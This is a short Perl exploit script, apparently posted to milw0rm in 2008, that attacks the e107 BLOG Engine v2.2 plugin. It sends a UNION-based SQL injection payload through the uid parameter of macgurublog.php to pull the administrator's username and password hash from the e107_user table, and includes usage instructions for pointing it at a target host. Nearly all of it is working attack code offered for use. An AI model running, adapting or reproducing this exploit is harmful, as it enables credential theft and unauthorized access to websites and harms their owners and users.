#!/usr/bin/perl 
##############################################################
# e107 Plugin BLOG Engine v2.2  SQL Injection Exploit        # 
#               ..::virangar security team::..               # 
#                    www.virangar.net                        # 
#         C0d3d BY:virangar security team ( hadihadi  )      # 
#special tnx to:                                             # 
#MR.nosrati,black.shadowes,MR.hesy,Ali007,Zahra              # 
#& all virangar members & all hackerz                        # 
# my lovely friends hadi_aryaie2004 & arash(imm02tal)        # 
#             ..:::Young Iranina Hackerz::..                 # 
############################################################## 
 
 
use HTTP::Request; 
use LWP::UserAgent; 
 
if (@ARGV != 1){ 
header(); 
} 
$site = $ARGV[0]; 
 
$attack= "$site"."?uid=-99999%20union%20select%201,concat(0x3c757365723e,user_name,0x3c757365723e,user_password),3%20from%20e107_user%20where%20user_ 
id=1/*"; 
$b = LWP::UserAgent->new() or die "Could not initialize browser\n"; 
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)'); 
$req = $b->request(HTTP::Request->new(GET=>$attack)); 
$res = $req->content; 
 
if ($res =~ /<user>(.*?)<user>/){ 
        print "\n[+] Admin User : $1";} 
if ($res =~/([0-9a-fA-F]{32})/){ 
print "\n[+] Admin Hash : $1\n\n"; 
print "\n[+]Done\n";} 
 
sub header { 
print qq{ 
################################################################### 
# e107 Plugin BLOG Engine v2.2  SQL Injection Exploit             # 
#                      www.virangar.net                           # 
#   Useage: perl $0 Host                                          # 
#                                                                 # 
#   Host: full patch to macgurublog.php (dont forget http://)     # 
#                                                                 # 
#  Example:                                                       # 
# perl $0 http://site/macgurublog_menu/macgurublog.php            # 
#                                                                 # 
################################################################### 
}; 
} 
#virangar.net[2008-05-22] 

# milw0rm.com [2008-09-01]
